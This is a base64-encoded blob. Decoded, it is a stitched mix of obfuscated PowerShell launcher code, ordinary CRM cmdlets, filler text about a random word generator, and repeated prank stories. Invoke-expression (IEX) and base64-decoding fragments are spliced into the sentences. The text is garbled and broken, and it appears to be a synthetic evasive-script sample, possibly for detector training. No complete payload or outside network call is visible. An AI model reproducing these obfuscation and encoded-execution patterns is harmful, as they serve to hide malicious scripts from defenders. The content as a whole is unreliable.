5dDVlSmlieE0xZG55RTNtRWZjNXMwSUVQMXVPMkYoJy1Ob25JbnRlcmFjdGl2ZScpKTsKICAgICAgICAgICRDb21tYW5kbGluZU9wdGlvbnMgKz0gJEZ1bGxBcmd1bWVudC5TdWJTdHJpbmcoMCwoR2V0LVJhbmRvbSAtTWluaW11bSA1IC1NYXhpbXVtICgkRnVsbEFyZ3VtZW50Lkxlbmd0aCsxKSkpCiAgICAgICAgfQogICAgICAgIElmKCRQU0JvdW5kUGFyYW1ldGVyc1soJ3soLTEgKyAyKX17KDAgKyAwKX0nLWYnZ28nLCdOb0xvJyldKQogICAgICAgIHsKICAgICAgICAgICRGdWxsQXJndW1lbnQgPSAoVDNJOXQ1ZWpJQnhNMUROWWUzTUVmYzVzMElFcDF1bzJmKCctTm9Mb2dvJykpOwogICAgICAgICAgJENvbW1hbmRsaW5lT3B0aW9ucyArPSAkRnVsbEFyZ3VtZW50LlN1YlN0cmluZygwLChHZXQtUmFuZG9tIC1NaW5pbXVtIDQgLU1heGltdW0gKCRGdWxsQXJndW1lbnQuTGVuZ3RoKzEpKSkKICAgICAgICB9CiAgICAgICAgSWYoJFBTQm91bmRQYXJhbWV0ZXJzWygneyg3IC0gNCl9eygyIC0gMSl9eygoW2ludF0oOCAvIDIpKSArIDEpfXsoLTEgKyA1KX17MH17Mn0nLWYneWwnLCduZCcsJ2UnLCdXaScsJ1N0Jywnb3cnKV0gLU9SICRXaW5kb3dzU3R5bGUpCiAgICAgICAgewogICAgICAgICAgICAkRnVsbEFyZ3VtZW50ID0gKFQzSTl0NWVqaUJYbTFEbnllM21lZmM1czBpZXAxVU8yRignLVdpbmRvd1N0eWxlJykpCiAgICAgICAgICAgIElmKCRXaW5kb3dzU3R5bGUpIHskQXJndW1lbnRWYWx1ZSA9ICRXaW5kb3dzU3R5bGV9CiAgICAgICAgICAgIEVsc2UgeyRBcmd1bWVudFZhbHVlID0gJFBTQm91bmRQYXJhbWV0ZXJzWygnezF9eygoMSArIDApIC0gKDMgLSAyKSl9Jy1mJ1N0eWxlJywnV2luZG93JyldfQoKICAgICAgICAgICAgIyRlbnY6dGVtcAogICAgIyBSYW5kb21seSBkZWNpZGUgdG8gd3JpdGUgV2luZG93U3R5bGUgdmFsdWUgd2l0aCBmbGFnIHN1YnN0cmluZyBvciBpbnRlZ2VyIHZhbHVlLgogICAgICAgICAgICBTd2l0Y2goJEFyZ3VtZW50VmFsdWUuVG9Mb3dlcigpKSBSZW1vdmUtQ3JtUmVjb3JkCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICgneygoMSAqIDUpIC0gMyl9eyhbaW50XSgxNSAvIDMpKX17KC0oMiArIDIpICsgKC0zICsgMTEpKX17MX17KC0oLTIgKyA0KSArICgxMCAtIDUpKX17KDEgLSAxKX0nLWYnbCcsJ20nLCduJywnYScsJ3InLCdvJykgICAge0lmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uMSkpIHskQXJndW1lbnRWYWx1ZSA9IChHZXQtUmFuZG9tIC1JbnB1dCBAKChUM2k5dDVlSmlCeG0xRE55RTNtZWZjNXMwaWVwMVVPMmYoJygwICsgMCknKSksKFQzSTl0NWVqaUJ4TTFETnllM01FRmM1czBJZVAxVU8yZignbicpKSwoVDNJOXQ1ZUppYlhtMWROeUUzTUVmYzVzMGlFcDF1TzJmKCdubycpKSwodDNJOVQ1ZWpJYlhNMWRueUUzTUVmQzVzMElFUDFVTzJmKCdub3InKSksKFQzSTl0NUVKSWJ4TTFEbnllM21lZmM1czBJZVAxVU8yZignbm9ybScpKSwodDNJOVQ1RWppYnhtMUROeWUzbUVmYzVTMGlFcDF1bzJGKCdub3JtYScpKSkpfX0KICAgICAgICAgICAgICAgICgneygwICsgMCl9eygyIC0gMSl9Jy1mJ2hpZCcsJ2RlbicpICAgIHtJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JEFyZ3VtZW50VmFsdWUgPSAoR2V0LVJhbmRvbSAtSW5wdXQgQCgoVDNpOXQ1RWppQlhNMURuWWUzbUVGYzVzMGllUDF1bzJGKCcoKC0xICsgNCkgLSAyKScpKSwoVDNJOXQ1RWppQnhNMUROeUUzTUVGYzVTMGlFcDF1bzJmKCdoJykpLCh0M0k5dDVlaklCeG0xZG55RTNNRUZjNVMwaWVwMXVPMkYoJ2hpJykpLChUM0k5dDVlSklCWE0xZG55ZTNtRWZjNXMwSUVwMVVPMmYoJ2hpZCcpKSwoVDNJOVQ1ZUpJQnhtMURueUUzbUVmYzVzMElFcDFVbzJGKCdoaWRkJykpLChUM0k5dDVlaklCWG0xZG55ZTNNZWZjNVMwSWVwMXVPMkYoJ2hpZGRlJykpKSl9fQogICAgICAgICAgICAgICAgKCd7KC0oMyArIDEpICsgKC0xICsgOSkpfXsoLSgtNSArIDEzKSArICgtMTIgKyAyOCkpfXsoMSArICgtMSArIDIpKX17OH17KC0oMiAqIDIpICsgKDE3IC0gOSkpfXsoW2ludF0oMzIgLyA0KSl9eygoMiArIDApICogMyl9eygxMyAtIDYpfXsxfSctZidpJywnZCcsJ24nLCdtJywnbScsJ2knLCd6JywnZScsJ2knKSB7SWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4xKSkgeyRBcmd1bWVudFZhbHVlID0gKEdldC1SYW5kb20gLUlucHV0IEAoKFQzSTl0NWVqaUJ4bTFEbllFM21FRkM1czBpRVAxdU8yZignMicpKSwoVDNJOVQ1RWppYnhtMURueUUzbWVGQzVTMGlFUDFVTzJmKCdtaScpKSwoVDNJOXQ1ZUpJQlhNMUROWUUzTUVGYzVzMElFcDF1bzJmKCdtaW4nKSksKHQzSTl0NUVqSUJ4bTFEbllFM21FZkM1czBpRVAxVU8yZignbWluaScpKSwodDNJOXQ1RWppQnhtMURueWUzbUVGYzVTMGlFcDFVTzJGKCdtaW5pbScpKSwoVDNpOXQ1ZWpJQlhNMURueUUzbUVmQzVzMEllUDF1TzJmKCdtaW5pbWknKSksKFQzSTlUNWVqSUJ4bTFEbnllM21FZmM1UzBJRXAxVU8yZignbWluaW1peicpKSwoVDNJOXQ1ZWppQnhtMURuWUUzTUVGYzVzMGlFUDF1TzJGKCdtaW5pbWl6ZScpKSkpfX0KICAgICAgICAgICAgICAgICgnezF9eygxIC0gMSl9Jy1mJ2l6ZWQnLCdtYXhpbScpIHtJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JEFyZ3VtZW50VmFsdWUgPSAoR2V0LVJhbmRvbSAtSW5wdXQgQCgoVDNJOVQ1ZUpJYnhNMURueWUzbUVmYzVTMGllUDFVTzJGKCcoW2ludF0oNiAvIDIpKScpKSwoVDNJOVQ1ZUppQnhtMWROeWUzTWVGQzVTMGllcDFVTzJGKCdtYScpKSwodDNJOXQ1RWpJQnhtMWROeUUzTUVmYzVTMGlFcDFVbzJGKCdtYXgnKSksKFQzSTl0NWVKSUJ4bTFEbllFM21lZkM1UzBJRXAxVU8yRignbWF4aScpKSwoVDNJOXQ1RWpJYnhNMURuWWUzbWVGYzVzMGllcDF1TzJmKCdtYXhpbScpKSwodDNJOXQ1RUppQnhtMUROWWUzbWVGYzVzMElFcDF1TzJmKCdtYXhpbWknKSksKHQzaTl0NWVqSWJYTTFEbllFM21lZmM1czBpZVAxVU8yZignbWF4aW1peicpKSwodDNJOXQ1ZWpJYnhtMWRuWUUzbUVmQzVTMElFcDFVTzJmKCdtYXhpbWl6ZScpKSkpfX0KICAgICAgICAgICAgICAgIGRlZmF1bHQge1dyaXRlLUVycm9yICgneygoMyAtIDIpICsgMyl9ezEyfXsoMSAqIDEzKX17Mn17KC0xICsgMil9eygoW2ludF0oNiAvIDIpKSAqIDMpfXsoKDMgLSAxKSAqICgyICogMikpfXsoLTggKyAoMTEgKyA3KSl9eygoMTcgLSA0KSAtICgtMiArIDQpKX17KC0xICsgNCl9eygzICogMil9ezB9eygyICsgMyl9eygxICogNyl9eyhbaW50XSg3MCAvICg1ICsgMCkpKX0nLWYnZm9yIE91dCcsJ2FsdWUgKCRkaUFzbmlyWnNqN2InLCdWYWx1ZSB2JywnIHN3aXRjaCcsJ0FuIGludmEnLCctUG93ZXJTJywnIGJsb2NrICcsJ2hlbGxMYXUnLCd0VmFsdWUpJywnQXJndW1lbicsJyB3YXMgcGEnLCdzc2VkIHRvJywnbGlkIGAkWWJzTUxCMG40eXBoS3JFTTlDY0YnLCdyZ3VtZW50JywnbmNoZXIuJyk7IEV4aXQ7fQogICAgICAgICAgICB9CgogICAgICAgICAgICAkUG93ZXJTaGVsbEZsYWdzICs9ICRGdWxsQXJndW1lbnQuU3ViU3RyaW5nKDAsKEdldC1SYW5kb20gLU1pbmltdW0gMiAtTWF4aW11bSAoJEZ1bGxBcmd1bWVudC5MZW5ndGgrMSkpKSArICcgJyooR2V0LVJhbmRvbSAtTWluaW11bSAxIC1NYXhpbXVtIDMpICsgJEFyZ3VtZW50VmFsdWUKICAgICAgICB9CiAgICAgICAgSWYoJFAKIkAKZnVuY3Rpb24gZ3sKCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUEFSQU0oCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1TZXJ2aWNlQ2xpZW50XSRjb25uLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJDcm1SZWNvcmQiLCBWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW1BTT2JqZWN0XSRDcm1SZWNvcmQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEsIFBhcmFtZXRlclNldE5hbWU9IkZpZWxkcyIpXQogICAgICAgIFtzdHJpbmddJEVudGl0eUxvZ2ljYWxOYW1lLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0yLCBQYXJhbWV0ZXJTZXROYW1lPSJGaWVsZHMiKV0KICAgICAgICBbZ3VpZF0kSWQKICAgICkKCiAgICBiZWdpbgogICAgewogICAgICAgICRjb25uID0gVmVyaWZ5Q3JtQ29ubmVjdGlvblBhcmFtIC1jb25uICRjb25uIC1waXBlbGluZVZhbHVlICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ2Nvbm4nKSkKICAgIH0KICAgIHByb2Nlc3MKICAgIHsKICAgICAgICBpZigkQ3JtUmVjb3JkIC1uZSAkbnVsbCkKICAgICAgICB7CiAgICAgICAgICAgICRFbnRpdHlMb2dpY2FsTmFtZSA9ICRDcm1SZWNvcmQubG9naWNhbG5hbWUKICAgICAgICAgICAgJElkID0gJENybVJlY29yZC4oJEVudGl0eUxvZ2ljYWxOYW1lICsgImlkIikKICAgICAgICB9CgogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgJHJlc3VsdCA9ICRjb25uLkRlbGV0ZUVudGl0eSgkRW50aXR5TG9naWNhbE5hbWUsICRJZCwgW0d1aWRdOjpFbXB0eSkKICAgICAgICAgICAgaWYoISRyZXN1bHQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIHRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCiAgICAgICAgfQogICAgfQp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBWb2NhYnVsYXJ5ClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIHZvY2FidWxhcnkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCBpcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAoKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBiKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIGIoKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcSSB3YXMgYXQgYSBzd2FuayBiYXIgZm9yIGEgd29yayBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCwgZSgpIHNvbWUgZ3JhZCBzdHVkZW50cyB3ZSBqKCkgZm9yIGFuIGgoKSBwcm9ncmFtLiBBZnRlciB3ZSBoYWQgYWxsIGhhZCBrKCkgZHJpbmtzLCBvbmUgb2YgdGhlIHN0dWRlbnRzIHNhaWQgdGhleSBkb250IGxpa2Ugc21va2VzIGJlY2F1c2UgdGhleSB0YXN0ZSBsaWtlIGEuIE15IGJvc3MgcmVwbGllZCwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBzbW9rZXMuIFNvIEkgY3V0IGluLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIGEuIEkgd2FzIGFza2VkIHRvIGxlYXZlLuKAnVNvdXJjZSM+CjwjVGhhdHMgZygpIE9uZSB0aW1lIEkgYXRlIDI2IGNob2NvbGF0ZSBjaGlwIGkoKSBiZWNhdXNlIEkgd2FzIG1hZCBhdCBteSBsaXR0bGUgbCgpIGFuZCBkaWRudCB3YW50IGhlciB0byBoYXZlIGFueS4gSSBwdWtlZCBhbGwgb3ZlciB0aGUgcGxhY2Uu4oCdIFNvdXJjZSM+Cjwj4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgYigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiBoewoKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSgKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdJGNvbm4sCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEsIFBhcmFtZXRlclNldE5hbWU9IkNybVJlY29yZCIpXQogICAgICAgIFtQU09iamVjdF0kQ3JtUmVjb3JkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJOYW1lV2l0aElkIildCiAgICAgICAgW3N0cmluZ10kRW50aXR5TG9naWNhbE5hbWUsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTIsIFBhcmFtZXRlclNldE5hbWU9Ik5hbWVXaXRoSWQiKV0KICAgICAgICBbZ3VpZF0kSWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTMpXQogICAgICAgIFtzdHJpbmddJFF1ZXVlTmFtZSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249NCldCiAgICAgICAgW2d1aWRdJFdvcmtpbmdVc2VySWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQb3NpdGlvbj01KV0KICAgICAgICBbYm9vbF0kU2V0V29ya2luZ0J5VXNlcgogICAgKQoJJGNvbm4gPSBWZXJpZnlDcm1Db25uZWN0aW9uUGFyYW0gLWNvbm4gJGNvbm4gLXBpcGVsaW5lVmFsdWUgKCRQU0JvdW5kUGFyYW1ldGVycy5Db250YWluc0tleSgnY29ubicpKSAgCiAgICBpZigkQ3JtUmVjb3JkIC1uZSAkbnVsbCkKICAgIHsKICAgICAgICAkRW50aXR5TG9naWNhbE5hbWUgPSAkQ3JtUmVjb3JkLmxvZ2ljYWxuYW1lCiAgICAgICAgJElkID0gJENybVJlY29yZC4oJEVudGl0eUxvZ2ljYWxOYW1lICsgImlkIikKICAgIH0KCiAgICB0cnkKICAgIHsKICAgICAgICAkcmVzdWx0ID0gJGNvbm4uQWRkRW50aXR5VG9RdWV1ZSgkSWQsICRFbnRpdHlMb2dpY2FsTmFtZSwgJFF1ZXVlTmFtZSwgJFdvcmtpbmdVc2VySWQsICRTZXRXb3JraW5nQnlVc2VyLCBbR3VpZF06OkVtcHR5KQoJCWlmKCEkcmVzdWx0KQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgTGFzdENybUNvbm5lY3RvckV4Y2VwdGlvbigkY29ubikKICAgICAgICB9CiAgICB9CiAgICBjYXRjaAogICAgewogICAgICAgIHRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCiAgICB9Cn0KPCM+PgpTcD1lbGxpbmcgYW5kIFZvY2FidWxhcnkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgdm9jYWJ1bGFyeSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZy